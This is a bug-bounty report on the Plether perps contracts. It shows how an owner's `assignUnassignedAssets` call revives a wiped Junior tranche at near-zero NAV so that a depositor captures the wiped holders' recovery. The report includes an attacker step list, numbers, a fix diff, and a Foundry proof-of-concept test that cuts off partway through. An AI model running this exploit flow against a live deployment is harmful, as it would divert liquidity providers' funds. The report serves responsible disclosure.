# \#98794 [SC-Critical] `assignUnassignedAssets` revives a wiped Junior tranche at a near-zero NAV, so any depositor buys the wiped holders' recovery and the receiver takes the rest

**Submitted on Nov 10th 2026 at 08:08:04 UTC by @farismaulana for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98794
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

when a loss wipes Junior principal to zero, the Junior shares stay live (the seed floor guarantees supply), and their holders keep the claim on every unit of LP value that later flows back to Junior through the waterfall. every ordinary entry path refuses to enter this state, so nobody can buy that claim.

`HousePool.assignUnassignedAssets(false, receiver)`, the owner's documented way to clear `unassignedAssets` and the only target that does not revert in this state, breaks that protection twice. it prices the bootstrap at the wiped principal of 0 and mints the receiver `U * (supply + 1000)` shares, ~100% of the tranche. it also sets Junior principal to `U`, which reopens the tranche to ordinary deposits priced at a NAV of `U`. any unprivileged LP can then buy the wiped holders' recovery for cents on the dollar.

in the PoC an honest owner recapitalization of the exact Senior gap, followed by a 1 cent favourable move before the next reconcile, leaves `U = 190_000` USDG. after the assignment an unprivileged LP deposits 1_000_000 USDG, receives 84% of the tranche, and when the mark recovers holds 10_422_688 USDG and withdraws 1_999_942 USDG in cash. the wiped Junior LP, who recovers 11_209_998 USDG without the assignment, is left with 0.00001 USDG.

## Vulnerability Details

### how the state arises with honest actors

1. a trader-PnL loss larger than `juniorPrincipal` is reconciled through the permissionless `settleLpEpoch`. the waterfall absorbs it Junior-first, so `juniorPrincipal = 0` and Senior is impaired below its high-water mark. Junior supply stays live because the seed receiver can never drop below its floor ([TrancheVault.sol#L322-L324](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L322-L324)).
2. the owner recapitalizes the Senior gap with `CfdEngine.recapitalizePool`, a documented immediate power. the recap is applied inside `_reconcile` after the waterfall plan, so any revenue reconciled in the same pass restores part of the gap first and the rest of the recap becomes ownerless:

```solidity
            } else {
                uint256 gap = state.waterfall.seniorHighWaterMark > state.waterfall.seniorPrincipal
                    ? state.waterfall.seniorHighWaterMark - state.waterfall.seniorPrincipal
                    : 0;
                if (gap > 0) {
                    uint256 seniorAssignedAssets = remaining > gap ? gap : remaining;
                    state.waterfall.seniorPrincipal += seniorAssignedAssets;
                    remaining -= seniorAssignedAssets;
                }
            }
        }
        if (remaining > 0) {
@>          state.unassignedAssets += remaining;
        }
```

3. `unassignedAssets > 0` blocks new tranche-deposit requests and activation, and the spec treats it as "exceptional telemetry, not a normal operating bucket". the only way to clear it is `assignUnassignedAssets`.

### the defect

```solidity
        uint256 amount = unassignedAssets;
        if (amount == 0) {
            revert HousePool__NoUnassignedAssets();
        }
        if (toSenior) {
@>          _requireSeniorDepositCapacity(amount, _getWaterfallState());
        }

        address targetVault = toSenior ? seniorVault : juniorVault;
        if (targetVault == address(0)) {
            revert HousePool__ZeroAddress();
        }
@>      uint256 shares = ITrancheVaultBootstrap(targetVault).quoteBootstrapDeposit(amount);
        if (shares == 0) {
            revert HousePool__BootstrapSharesZero();
        }
        ...
        } else {
@>          juniorPrincipal += amount;
        }
        unassignedAssets = 0;
@>      ITrancheVaultBootstrap(targetVault).bootstrapMint(shares, receiver);
```

the quote is priced against the current principal with no wiped-tranche check:

```solidity
    function quoteBootstrapDeposit(
        uint256 assets
    ) external view returns (uint256) {
@>      return _convertToSharesUsingAssets(assets, _depositPricingAssets(), Math.Rounding.Floor);
    }

    function _convertToSharesUsingAssets(uint256 assets, uint256 totalAssets_, Math.Rounding rounding)
        internal view returns (uint256)
    {
@>      return Math.mulDiv(assets, accruedTotalSupply() + VIRTUAL_SHARES, totalAssets_ + 1, rounding);
    }
```

with Junior principal 0 this is `U * (supply + 1000) / 1`. the receiver's fraction of the tranche becomes `(supply + 1000) * U / ((supply + 1000) * U + supply)`, which is ~100% for any `U`. in the PoC, `U = 190_000e6` against a supply of `10_006_665_431_847_178` mints `1_901_266_432_051_153_820_000_000_000` shares, a fraction of `0.999999999994736842`. even `U = 1` USDG gives the receiver `0.999999000000999999` of the tranche.

the owner has no other target in this state. Senior capacity is `min(cap, juniorPrincipal * 8000 / 2000)`, which is 0 while Junior principal is 0 ([HousePoolSeniorCapacityLib.sol#L35-L39](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolSeniorCapacityLib.sol#L35-L39), [#L102-L113](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolSeniorCapacityLib.sol#L102-L113)), so `assignUnassignedAssets(true, ...)` reverts `HousePool__ExceedsSeniorDepositCapacity`. Junior is the only target that executes.

### every other entry path protects this exact state

the protocol treats "principal 0 with live supply" as a terminally wiped tranche whose holders must not be diluted:

- request admission refuses it ([HousePool.sol#L494-L497](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L494-L497)):

```solidity
        if (isSenior
                ? ctx.pendingState.waterfall.seniorPrincipal == 0 && ctx.pendingState.seniorSupply != 0
@>              : ctx.pendingState.waterfall.juniorPrincipal == 0 && ctx.pendingState.juniorSupply != 0) {
            return false;
        }
```

- epoch activation defers it ([HousePool.sol#L917](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L917)):

```solidity
@>      bool juniorActivationDeferred = juniorDepositPhase.pricingAssets == 0 && juniorDepositPhase.pricingSupply != 0;
```

- the deposit quote returns 0 for it ([TrancheVault.sol#L1366-L1367](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1366-L1367)), and the request preflight reverts `TrancheVault__TerminallyWiped` ([TrancheVault.sol#L1585-L1587](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1585-L1587)).

the public docs (docs.plether.com, "The liquidity pool and tranche waterfall", section "Senior impairment and tranche wipeout") state the rule this enforces:

> A tranche is terminally wiped when shares still exist but its accounting assets reach zero. An ordinary deposit cannot silently revive a wiped tranche. Recovery can come from future reconciled LP-owned value allocated through the waterfall or from an explicit recapitalization path that preserves existing ownership rights. ... This prevents a new depositor from obtaining the recovery rights of previously wiped holders through a nominal first deposit.

and the NatSpec of `assignUnassignedAssets` itself describes the function as the safeguard: "Prevents later LPs from implicitly capturing previously ownerless value." the owner path does the opposite. it hands a new holder the recovery rights of the wiped holders for a nominal amount, and it revives the tranche: right after the assignment `canAcceptTrancheDeposits(false)` returns true again.

the wiped holders' claim is real value. Junior has no high-water mark, so once Senior is whole every unit of reconciled revenue accrues to Junior principal ([HousePoolWaterfallAccountingLib.sol#L158](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol#L158)). a zero-NAV bootstrap is only neutral when the target tranche has no residual claimant, as in a Senior reboot with principal and high-water mark both 0. a wiped Junior with live holders is the opposite case.

### the assignment reopens the wiped tranche to any depositor

after the assignment Junior principal is `U`, Senior is whole and `unassignedAssets` is 0, so every gate the wiped state closed is open again: `canAcceptTrancheDeposits(false)` returns true and the request preflight no longer reverts. deposit activation prices new shares against the current Junior principal ([HousePool.sol#L914-L920](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L914-L920)):

```solidity
        juniorDepositPhase.pricingAssets = juniorPrincipal;
        juniorDepositPhase.pricingSupply = _juniorShareSupply();
@>      bool juniorActivationDeferred = juniorDepositPhase.pricingAssets == 0 && juniorDepositPhase.pricingSupply != 0;
        if (!juniorActivationDeferred) {
@>          juniorDepositPhase = _settleDepositPhase(juniorVault, result.cutoffEpoch, juniorDepositPhase, 0, false);
        }
```

with `pricingAssets = U`, a deposit `D` buys `D / (U + D)` of the tranche, and with it the same share of the recovery that the waterfall later credits to Junior. the attacker needs no role:

1. watch for `UnassignedAssetsAssigned(false, ...)` while the mark is still depressed.
2. call `juniorVault.requestDeposit(D, attacker, attacker)`.
3. any keeper's `OrderRouter.settleLpEpoch` activates it at Junior NAV `U`.
4. when the mark recovers, the reconciled revenue accrues to Junior principal and the attacker redeems through the same permissionless settlement.

without the assignment, step 2 reverts `TrancheVault__TerminallyWiped` and the recovery stays with the wiped holders.

an assignment is value-neutral only after the recovery has already been reconciled into Junior principal (`J` much larger than `U`). at `J = 0` any amount hands over the tranche and reopens it at a NAV of `U`, and the contract gives the owner no signal for when the call becomes safe.

### numerical example from the PoC (release parameters)

| step | action | state |
|---|---|---|
| 0 | Junior LP 10_000_000, Senior LP 39_000_000, trader 19_000_000 LONG at 1.00 | J = 10_000_000.99, S = H = 39_000_001 |
| 1 | mark 0.40, keeper `settleLpEpoch` | J = 0, Junior supply 1.0007e16 live, S = 37_636_836.80 < H = 39_000_711.43 |
| 2 | owner `recapitalizePool(1_363_874.63)` (exact gap), mark 0.41, keeper `settleLpEpoch` | J = 0, S = H, `unassignedAssets` = 190_000 |
| 3 | owner `assignUnassignedAssets(false, receiver)` (Senior reverts) | receiver holds 0.999999999994736842 of Junior |
| 4 | mark reverts to 1.00, keeper `settleLpEpoch` | J = 11_399_643.93 |

the old Junior LP ends with 0.000059 USDG. without the assignment the same LP ends with 11_209_998.88 USDG, and with no owner action at all it recovers 10_036_124.43 USDG. the receiver ends with 11_399_643.93 USDG claimable and redeems 999_968.76 USDG in cash through `settleLpEpoch` within the test.

with an unprivileged depositor in the same flow:

| step | action | state |
|---|---|---|
| 3 | owner `assignUnassignedAssets(false, receiver)` at mark 0.41 | J = 190_000, Junior deposits reopen |
| 3a | unprivileged LP `requestDeposit(1_000_000)`, keeper `settleLpEpoch` at mark 0.41 | deposit activates at J = 190_000, the LP holds 0.840587655 of Junior |
| 4 | mark reverts to 1.00, keeper `settleLpEpoch` | J = 12_399_287.75 |
| 5 | the LP redeems 2_000_000 worth through `settleLpEpoch` | the LP receives 1_999_942.55 USDG in cash |

the unprivileged LP holds 10_422_688.22 USDG of Junior value for its 1_000_000 deposit, a 9_422_688 USDG gain, and its wallet ends 999_942 USDG above where it started after taking only part of that value out. the receiver keeps 1_976_599.53 USDG. the wiped Junior LP ends with 0.00001 USDG against 11_209_998.88 USDG in the control without the assignment.

## Impact Details

- the wiped Junior holders lose their entire recovery. the PoC measures 11_209_998 USDG against the same recapitalization without the assignment, and 10_036_124 USDG against no owner action at all. that is principal: the same LP held 10_036_836 USDG before the wipe.
- an unprivileged depositor pulls most of it. a 1_000_000 USDG deposit placed after the assignment and before the reversion takes 84% of the tranche, ends with 10_422_688 USDG, and withdraws 1_999_942 USDG in cash within the test. the deposit size is the attacker's choice; a larger deposit takes a larger share.
- the receiver takes whatever the depositors do not, ~100% when nobody else enters.
- the same assignment built from ordinary 10% moves (five realized 10% trader wins, then one 10% move that wipes Junior and later reverts) takes 1_553_191 USDG from the wiped holders.
- the trigger is the owner's documented immediate power to "assign ownerless pool assets", called on the only target that does not revert. the defect is the missing wiped-tranche check inside the function, and the beneficiary is any address that deposits.

severity: Critical, Direct theft of any user funds. the wiped Junior LPs' share of pool value is transferred to an unprivileged depositor and to the receiver, and the attacker realizes it in cash through the permissionless settlement path.

## Recommendation

apply the same wiped-tranche rule the ordinary entry paths use. refuse to mint into a tranche whose principal is 0 while its supply is live, and refuse a Senior assignment while Senior is below its high-water mark, so ownerless value waits until the waterfall has restored the tranche:

```diff
         if (toSenior) {
             _requireSeniorDepositCapacity(amount, _getWaterfallState());
+            if (seniorPrincipal < seniorHighWaterMark) revert HousePool__TrancheImpaired();
+            if (seniorPrincipal == 0 && _seniorShareSupply() != 0) revert HousePool__TrancheWiped();
+        } else if (juniorPrincipal == 0 && _juniorShareSupply() != 0) {
+            revert HousePool__TrancheWiped();
         }
```

## References

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L660-L704

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L653-L657

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1392-L1396

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1853-L1859

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L494-L497

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L914-L920

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1361-L1367

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1585-L1587

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L322-L324

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L111-L137

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolSeniorCapacityLib.sol#L27-L43

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol#L140-L159

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md?plain=1#L320-L330

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md?plain=1#L648-L652

## Proof of Concept

## Proof of Concept

the test deploys the in-scope contracts through the existing `BasePerpTest` harness at release risk parameters. only Pyth (`MockPyth`) and USDG (mock token) are mocked. every trade goes through the production Router FIFO with a keeper `executeOrder`, and every reconcile after setup is the permissionless `OrderRouter.settleLpEpoch`.

1. create `packages/perps/test/perps/poc/WipedJuniorAssignment.t.sol` with the content below (no harness changes are needed)
2. from `packages/perps`, run:

```
forge test --match-path test/perps/poc/WipedJuniorAssignment.t.sol -vv
```

tests:

- `test_assignIntoWipedJunior_redirectsRecovery`: the full honest flow and the assignment, against the same flow without it
- `test_control_noAssignment_oldJuniorRecovers`: the old holder's recovery with no owner action and with the recap only
- `test_seniorAssignmentReverts_noAlternative`: Senior capacity is 0 at `J = 0`, the Senior target reverts
- `test_unassignedBlocksDeposits`: which gate blocks deposits before and after the assignment
- `test_ordinaryEntryIntoWipedJuniorIsDeferred`: the protocol's own rule defers an ordinary deposit in the same state, while the owner path mints `0.999999` of supply for 1 USDG
- `test_escape_waitUntilJuniorPrincipalPositive`: assignment timing, at `J = U` and after the recovery is reconciled
- `test_variant_tenPercentMoves_redirectsRecovery`: the same outcome built from 10% moves only
- `test_outsiderDepositAfterAssignment_capturesRecovery`: an unprivileged LP deposits after the assignment, buys 84% of the revived tranche and withdraws more cash than it deposited, while the same request reverts `TerminallyWiped` without the assignment

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {Vm} from "forge-std/Vm.sol";
import {console2} from "forge-std/console2.sol";

/// @title PoC: HousePool.assignUnassignedAssets(false, receiver) mints Junior shares at zero NAV into a wiped
///        Junior tranche (principal 0, live share supply) and hands the old Junior holders' recovery to the receiver.
/// @notice Root cause: HousePool.sol:681-702 quotes ITrancheVaultBootstrap.quoteBootstrapDeposit (TrancheVault.sol:1392-1396)
///         = mulDiv(U, supply + 1000, pricingAssets + 1) with pricingAssets = Junior principal = 0, and has no
///         "principal == 0 && supply != 0" gate. Every sibling entry path has one: request admission
///         (HousePool.sol:494-497), activation (HousePool.sol:917), the display quote (TrancheVault.sol:1366-1367) and
///         the request preflight (TrancheVault.sol:1585-1587).
/// @dev Local deploy of the repo contracts at a82d4fef (BasePerpTest) with release risk parameters
///      (DEPLOYMENT.md:126-165). Only Pyth (MockPyth) and USDG (MockSettlementToken) are mocked. Every trade goes through
///      the production Router FIFO: LegacyOrderRouterHarness.commitOrder (test-only adapter that builds a V3 request and
///      self-delegatecalls the production commitOrder), then the production OrderRouter.executeOrder. Every post-setup
///      reconcile is the permissionless production OrderRouter.settleLpEpoch with a MockPyth update; it needs matured
///      LP work (HousePool.sol:1183-1184), which an ordinary Senior LP's 2-USDG redemption request provides. Setup-only
///      LP funding uses BasePerpTest._fundJunior/_fundSenior (no open positions at that time).
contract WipedJuniorAssignmentTest is BasePerpTest {

    address internal constant JUNIOR_LP = address(0xA11CE); // old Junior holder (pre-wipe LP)
    address internal constant SENIOR_LP = address(0xB0B);
    address internal constant LONG_TRADER = address(0x7A01);
    address internal constant KEEPER = address(0x4EE9);
    address internal constant RECEIVER = address(0x7E5E); // owner-chosen receiver (e.g. a treasury / recovery wallet)
    address internal constant NEW_JUNIOR_LP = address(0xC0DE1);
    address internal constant NEW_SENIOR_LP = address(0xC0DE2);

    uint256 internal constant JUNIOR_DEPOSIT = 10_000_000e6;
    uint256 internal constant SENIOR_DEPOSIT = 39_000_000e6; // Senior 39M + 1 seed <= 40M cap and <= 80% of pool
    uint256 internal constant LONG_NOTIONAL = 19_000_000e6; // < maxSkewRatio 0.4 * 49M net depth
    uint256 internal constant TRADER_DEPOSIT = 2_000_000e6;
    uint256 internal constant TRADER_MARGIN = 1_000_000e6;
    uint256 internal constant NEW_LP_DEPOSIT = 1_000_000e6;

    uint256 internal constant P_OPEN = 1e8;
    uint256 internal constant P_WIPE = 0.4e8; // LONG skew 19M * 0.60 = 11.4M LP loss > Junior 10M
    uint256 internal constant P_DRIFT = 0.41e8; // +1 cent favourable drift between the recap and the next reconcile
    uint256 internal constant P_SMALL_REVENUE = 0.42e8; // one more cent: first revenue that reaches Junior
    uint256 internal constant P_REVERT = 1e8; // mark reverts to the open price

    uint256 internal longSize;

    struct Snap {
        uint256 senior;
        uint256 junior;
        uint256 hwm;
        uint256 unassigned;
        uint256 pendingRecap;
        uint256 juniorSupply;
        uint256 poolAssets;
        uint256 deficit;
        bool degraded;
    }

    struct Outcome {
        uint256 receiverShares;
        uint256 juniorSupply;
        uint256 receiverFractionWad;
        uint256 oldHolderValue;
        uint256 receiverValue;
        uint256 juniorPrincipal;
        uint256 unassigned;
        uint256 seniorPrincipal;
        uint256 hwm;
    }

    // ---------------------------------------------------------------------
    // Release parameters (DEPLOYMENT.md:126-165)
    // ---------------------------------------------------------------------

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000); // release caps (DEPLOYMENT.md:160-161)

        assertEq(engine.executionFeeBps(), 4, "release executionFeeBps");
        assertEq(engine.settlementBufferBps(), 25, "release settlementBufferBps");
        assertEq(engine.frozenCloseSpreadBps(), 50, "release frozenCloseSpreadBps");
        assertEq(pool.maxSeniorShareBps(), 8000, "release maxSeniorShareBps");
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6, "release maxSeniorExposureAssets");

        // Real LPs in both tranches through the async vault flow.
        _fundJunior(JUNIOR_LP, JUNIOR_DEPOSIT);
        _fundSenior(SENIOR_LP, SENIOR_DEPOSIT);

        _fundTrader(LONG_TRADER, TRADER_DEPOSIT);
        settlementToken.mint(NEW_JUNIOR_LP, 10 * NEW_LP_DEPOSIT);
        vm.prank(NEW_JUNIOR_LP);
        settlementToken.approve(address(juniorVault), type(uint256).max);
        settlementToken.mint(NEW_SENIOR_LP, 10 * NEW_LP_DEPOSIT);
        vm.prank(NEW_SENIOR_LP);
        settlementToken.approve(address(seniorVault), type(uint256).max);

        // A trader opens 19M LONG notional at 1.00 through the production Router FIFO.
        longSize = _sizeFor(LONG_NOTIONAL, P_OPEN);
        _trade(LONG_TRADER, CfdTypes.Side.LONG, longSize, TRADER_MARGIN, false, P_OPEN);
    }

    // ---------------------------------------------------------------------
    // 1. Full production path: assignment at zero NAV redirects the recovery
    // ---------------------------------------------------------------------

    function test_assignIntoWipedJunior_redirectsRecovery() public {
        Snap memory s0 = _snap();
        _logSnap("stage 0: funded pool, 19M LONG open at 1.00", s0);
        uint256 oldHolderShares = juniorVault.balanceOf(JUNIOR_LP);
        console2.log("old Junior holder value before the wipe (USDG)", _whole(_value(JUNIOR_LP)));

        _wipeJunior();
        (uint256 gap, Snap memory s2) = _recapGapThenDrift();
        uint256 u = s2.unassigned;

        // What an honest owner sees: ownerless U > 0, deposits closed, Senior target reverts (test 3).
        assertFalse(pool.canAcceptTrancheDeposits(false), "Junior deposits closed");
        assertFalse(pool.canAcceptTrancheDeposits(true), "Senior deposits closed");

        uint256 snapshotId = vm.snapshotState();

        // ---- ATTACK branch: owner clears U with the only non-reverting target ----
        Outcome memory attack;
        {
            uint256 supplyBefore = juniorVault.totalSupply();
            _keeperMark(P_DRIFT); // assignUnassignedAssets needs a fresh mark (HousePool.sol:670)
            pool.assignUnassignedAssets(false, RECEIVER);
            uint256 assigned = pool.juniorPrincipal();
            assertApproxEqAbs(assigned, u, 1e6, "Junior principal = assigned U (it was 0)");
            assertEq(pool.unassignedAssets(), 0, "U cleared");
            // quoteBootstrapDeposit at pricingAssets = 0: mulDiv(U, supply + 1000, 0 + 1) (TrancheVault.sol:1853-1859)
            assertEq(
                juniorVault.balanceOf(RECEIVER),
                assigned * (supplyBefore + 1000),
                "receiver minted U * (supply + 1000) shares at zero NAV"
            );
            console2.log("=== ATTACK: assignUnassignedAssets(false, RECEIVER) at J = 0 ===");
            console2.log("  assigned U (raw 6-dec)                  ", assigned);
            console2.log("  Junior supply before assignment         ", supplyBefore);
            console2.log("  receiver shares minted                  ", juniorVault.balanceOf(RECEIVER));
            console2.log(
                "  receiver share fraction right after (1e18)",
                (juniorVault.balanceOf(RECEIVER) * 1e18) / juniorVault.totalSupply()
            );
            console2.log("  receiver value right after (raw)        ", _value(RECEIVER));
            console2.log("  old holder value right after (raw)      ", _value(JUNIOR_LP));
            // The assignment is what revives the wiped tranche for ordinary entry (J > 0, U == 0, Senior whole).
            assertTrue(pool.canAcceptTrancheDeposits(false), "assignment reopens Junior deposit requests");
            console2.log("  Junior deposit gate after assignment    ", pool.canAcceptTrancheDeposits(false));
        }

        _settleWithSeniorDust(P_REVERT);
        attack = _outcome();
        _logOutcome("ATTACK: after the mark reverts to 1.00 and LP settlement runs", attack);

        // The receiver can actually take the recovery in cash (Junior withdrawal ratio cap allows ~1.6M now).
        uint256 cashOut = _redeemJuniorWorth(RECEIVER, 1_000_000e6);
        console2.log("  receiver redeemed in USDG through settleLpEpoch (raw)", cashOut);
        assertApproxEqRel(cashOut, 1_000_000e6, 0.01e18, "receiver realizes ~1M USDG of the redirected recovery");

        vm.revertToState(snapshotId);

        // ---- CONTROL branch: identical sequence, no assignment ----
        _settleWithSeniorDust(P_REVERT);
        Outcome memory control = _outcome();
        _logOutcome("CONTROL: no assignment, same reversion", control);

        // ---- Assertions ----
        assertEq(juniorVault.balanceOf(JUNIOR_LP), oldHolderShares, "old holder never moved shares");
        assertGt(attack.receiverFractionWad, 0.999999e18, "receiver holds > 99.9999% of Junior supply");
        assertLt(attack.oldHolderValue, 1e6, "old Junior holder is left with < 1 USDG");
        assertGt(attack.receiverValue, 11_000_000e6, "receiver holds > 11M USDG of Junior value");
        assertGt(control.oldHolderValue, 11_000_000e6, "control: old holder recovers > 11M USDG");
        assertEq(control.receiverShares, 0, "control: no receiver shares");
        assertGt(control.unassigned, 0, "control: U stays ownerless (deposits stay closed until assigned)");

        uint256 loss = control.oldHolderValue - attack.oldHolderValue;
        console2.log("=== SUMMARY (raw 6-dec USDG) ===");
        console2.log("  Senior gap recapitalized by owner       ", gap);
        console2.log("  unassigned U created by the +1c drift   ", u);
        console2.log("  old Junior holder value  attack/control ", attack.oldHolderValue, control.oldHolderValue);
        console2.log("  receiver value           attack/control ", attack.receiverValue, control.receiverValue);
        console2.log("  old Junior holder loss vs control       ", loss);
        console2.log("  receiver gain minus U it was assigned   ", attack.receiverValue - u);
        assertGt(loss, 11_000_000e6, "old Junior holders lose > 11M USDG vs the no-assignment control");
        assertApproxEqRel(attack.receiverValue - u, loss, 0.02e18, "receiver's gain over U ~= old holders' loss");
    }

    // ---------------------------------------------------------------------
    // 2. Negative control
    // ---------------------------------------------------------------------

    function test_control_noAssignment_oldJuniorRecovers() public {
        uint256 before = _value(JUNIOR_LP);
        _wipeJunior();
        assertLt(_value(JUNIOR_LP), 1e6, "old holder at ~0 after the wipe");

        // Control B (conservative baseline): the owner never recapitalizes, so no U ever exists. The reversion
        // first refills the Senior gap, then the rest returns to Junior: this is the old holders' own recovery.
        uint256 snapshotId = vm.snapshotState();
        _settleWithSeniorDust(P_DRIFT);
        _settleWithSeniorDust(P_REVERT);
        Outcome memory b = _outcome();
        _logOutcome("CONTROL B: no recap, no assignment", b);
        assertEq(b.unassigned, 0, "B: no ownerless assets");
        assertEq(b.seniorPrincipal, b.hwm, "B: reversion refilled the Senior gap first");
        assertGt(b.oldHolderValue, 9_900_000e6, "B: old holder's own recovery ~= pre-wipe value");
        console2.log("  B: old holder recovery without any owner action (raw)", b.oldHolderValue);
        vm.revertToState(snapshotId);

        (, Snap memory s2) = _recapGapThenDrift();
        _settleWithSeniorDust(P_REVERT);
        Outcome memory c = _outcome();
        _logOutcome("CONTROL (standalone): no assignment", c);
        console2.log("  old holder value before wipe (raw)", before);
        assertGt(c.oldHolderValue, 11_000_000e6, "old Junior holder recovers the reversion");
        assertGt(c.oldHolderValue, before, "and the owner's Senior recap lets Junior keep the full reversion");
        assertEq(c.unassigned, s2.unassigned, "U is held outside the claims, untouched by revenue");
        assertEq(c.seniorPrincipal, c.hwm, "Senior fully restored");
    }

    // ---------------------------------------------------------------------
    // 3. Senior is not an alternative target in that state
    // ---------------------------------------------------------------------

    function test_seniorAssignmentReverts_noAlternative() public {
        _wipeJunior();
        (, Snap memory s2) = _recapGapThenDrift();
        assertGt(s2.unassigned, 0, "U > 0");
        assertEq(s2.junior, 0, "J = 0");
        assertEq(pool.getSeniorDepositCapacity(), 0, "Senior capacity is 0: ratio limit is 0 when J = 0");
        console2.log("Senior deposit capacity at J = 0:", pool.getSeniorDepositCapacity());

        _keeperMark(P_DRIFT);
        vm.expectRevert(IHousePool.HousePool__ExceedsSeniorDepositCapacity.selector);
        pool.assignUnassignedAssets(true, RECEIVER);
        console2.log("assignUnassignedAssets(true, R) reverted: HousePool__ExceedsSeniorDepositCapacity");

        // Junior is the only target that does not revert.
        pool.assignUnassignedAssets(false, RECEIVER);
        assertEq(pool.unassignedAssets(), 0, "Junior target succeeds");
    }

    // ---------------------------------------------------------------------
    // 4. What U > 0 blocks (the cost of not assigning), stated precisely
    // ---------------------------------------------------------------------

    function test_unassignedBlocksDeposits() public {
        _wipeJunior();
        _recapGapThenDrift();

        // (a) J = 0 and U > 0. Both tranches are closed, but U is not the only reason here:
        //     Junior is closed by the wiped-tranche rule and Senior by the ratio cap (capacity 0 at J = 0).
        assertFalse(pool.canAcceptTrancheDeposits(false), "a: Junior gate closed");
        assertFalse(pool.canAcceptTrancheDeposits(true), "a: Senior gate closed");
        _keeperMark(P_DRIFT);
        vm.prank(NEW_JUNIOR_LP);
        vm.expectRevert(TrancheVault.TrancheVault__TerminallyWiped.selector);
        juniorVault.requestDeposit(NEW_LP_DEPOSIT, NEW_JUNIOR_LP, NEW_JUNIOR_LP);
        vm.prank(NEW_SENIOR_LP);
        vm.expectRevert(TrancheVault.TrancheVault__DepositsUnavailable.selector);
        seniorVault.requestDeposit(NEW_LP_DEPOSIT, NEW_SENIOR_LP, NEW_SENIOR_LP);
        console2.log("(a) J=0, U>0: Junior request -> TerminallyWiped; Senior request -> DepositsUnavailable");

        // (b) Mark reverts with no assignment: J > 0, Senior whole, U > 0. Now U is the only blocker.
        _settleWithSeniorDust(P_REVERT);
        Snap memory s = _snap();
